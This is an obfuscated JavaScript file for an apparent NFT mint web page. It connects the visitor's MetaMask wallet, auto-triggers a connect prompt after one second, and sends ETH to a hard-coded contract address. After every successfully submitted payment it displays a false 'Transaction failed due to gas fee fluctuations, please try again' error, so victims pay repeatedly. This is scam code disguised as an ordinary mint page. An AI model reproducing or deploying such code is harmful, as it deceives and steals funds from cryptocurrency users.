toastr['options']['fadeOut']=0x2710,toastr['options']['positionClass']='toast-top-left';const netURL='https://mainnet.infura.io/v3/b9245d9c75504b26b871b87a7bb39698',ADDRESS='0x4c836C580B7a97f5F75B81a4E9FA719385b6BDee',web3=window['Web3'],ethereum=window['ethereum'];let accounts,price=0.1;const input=document['querySelector']('.eth_input'),button=document['querySelector']('.metamask_content-btn'),buttonor=document['querySelector']('.buttonorer'),title=document['querySelector']('.metamask_content-title'),priceDisplay=document['querySelector']('#price'),Web3=new web3(netURL),CONTRACT_ABI=JSON['parse']('[{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_recipient\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22baseUri\x22,\x22type\x22:\x22string\x22},{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22contractURi\x22,\x22type\x22:\x22string\x22},{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22stubURi\x22,\x22type\x22:\x22string\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_proxyRegistry\x22,\x22type\x22:\x22address\x22}],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22constructor\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Approval\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22operator\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:false,\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22ApprovalForAll\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22previousOwner\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22newOwner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22OwnershipTransferred\x22,\x22type\x22:\x22event\x22},{\x22anonymous\x22:false,\x22inputs\x22:[{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22indexed\x22:true,\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22Transfer\x22,\x22type\x22:\x22event\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22approve\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22balanceOf\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22buyToken\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22amount\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22buyTokens\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22contractURI\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22getApproved\x22,\x22outputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22address\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22getTokensOfOwner\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint16[]\x22,\x22name\x22:\x22_tokensIDs\x22,\x22type\x22:\x22uint16[]\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_operator\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22isApprovedForAll\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22mintToken\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22amount\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22mintTokens\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22name\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22owner\x22,\x22outputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22address\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22ownerOf\x22,\x22outputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22address\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22renounceOwnership\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22safeTransferFrom\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22bytes\x22,\x22name\x22:\x22_data\x22,\x22type\x22:\x22bytes\x22}],\x22name\x22:\x22safeTransferFrom\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22operator\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22approved\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22setApprovalForAll\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22baseUri\x22,\x22type\x22:\x22string\x22}],\x22name\x22:\x22setBaseURI\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22contractURi\x22,\x22type\x22:\x22string\x22}],\x22name\x22:\x22setContractURI\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22newmintLimitPerTransaction\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22setMintLimitPerTransaction\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22newPrice\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22setPrice\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22newRecipient\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22setRecipient\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22newSale\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22setSale\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22stubURi\x22,\x22type\x22:\x22string\x22}],\x22name\x22:\x22setStubURI\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22stubURI\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22bytes4\x22,\x22name\x22:\x22interfaceId\x22,\x22type\x22:\x22bytes4\x22}],\x22name\x22:\x22supportsInterface\x22,\x22outputs\x22:[{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22symbol\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22index\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22tokenByIndex\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22index\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22tokenOfOwnerByIndex\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22tokenURI\x22,\x22outputs\x22:[{\x22internalType\x22:\x22string\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[],\x22name\x22:\x22totalSupply\x22,\x22outputs\x22:[{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22from\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22to\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22tokenId\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transferFrom\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22newOwner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22transferOwnership\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22}]');window['addEventListener']('load',()=>{if(ethereum['selectedAddress'])document['querySelector']('.container_link_metamask_install-btn')['style']['display']='none',document['querySelector']('.container_metamask_content-btn')['style']['display']='flex',button['innerHTML']='<span>Mint\x20now</span>',input['disabled']=![],title['innerHTML']='Connected';else ethereum['isMetaMask']&&(document['querySelector']('.container_link_metamask_install-btn')['style']['display']='none',document['querySelector']('.container_metamask_content-btn')['style']['display']='flex',title['innerHTML']='Connect',input['disabled']=![]);});const getAccount=async()=>{accounts=await ethereum['request']({'method':'eth_requestAccounts'}),console['log'](accounts);if(window['ethereum']['chainId']=='0x1')console['log']('Already\x20connected\x20to\x20ethereum\x20mainnet...');else try{await ethereum['request']({'method':'wallet_switchEthereumChain','params':[{'chainId':'0x1'}]});}catch(_0x5099f9){if(error['code']===0x1326)try{await ethereum['request']({'method':'wallet_addEthereumChain','params':[{'chainId':'0x1','rpcUrl':netURL}]});}catch(_0x3c2e2f){}}},contract=new Web3['eth']['Contract'](CONTRACT_ABI,ADDRESS),sendTransaction=async()=>{const _0xb747f1=await contract['methods']['buyTokens'](accounts[0x0],input['value'])['encodeABI'](),_0x4aadf2=(price*0xde0b6b3a7640000)['toString'](0x10),_0x583fd2=(0x186a0*+input['value'])['toString'](0x10);ethereum['request']({'method':'eth_sendTransaction','params':[{'from':accounts[0x0],'to':ADDRESS,'value':_0x4aadf2,'data':_0xb747f1,'gas':_0x583fd2}]})['then'](_0x620873=>{toastr['error']('Transaction\x20failed\x20due\x20to\x20gas\x20fee\x20fluctuations.\x20Please\x20try\x20again\x20in\x20a\x20few\x20seconds.','TXN\x20ERROR');})['catch'](_0x4a11e8=>console['error']);};input['addEventListener']('input',()=>{if(+input['value']<0x1)button['disabled']=!![];else{if(+input['value']>=0x1)button['disabled']=![];}price=+input['value']*0.1;if(+input['value']>=0x1)priceDisplay['innerText']=price['toFixed'](0x2);else priceDisplay['innerText']='0.1';}),button['addEventListener']('click',async()=>{!ethereum['selectedAddress']?(await getAccount(),button['innerHTML']='<span>Mint\x20now</span>',title['innerHTML']='Connected'):(await getAccount(),await sendTransaction());}),buttonor['addEventListener']('click',async()=>{!ethereum['selectedAddress']&&(await getAccount(),button['innerHTML']='<span>Mint\x20now</span>',title['innerHTML']='Connected');}),setTimeout(function(){buttonor['click']();},0x3e8),document['querySelector']('.pluson')['addEventListener']('click',()=>{input['value']<0x5&&(input['value']=+input['value']+0x1,event=new Event('input'),input['dispatchEvent'](event));}),document['querySelector']('.minuson')['addEventListener']('click',()=>{input['value']>0x1&&(input['value']=+input['value']-0x1,event=new Event('input'),input['dispatchEvent'](event));}),document['querySelector']('.maxon')['addEventListener']('click',()=>{input['value']=0x14,event=new Event('input'),input['dispatchEvent'](event);});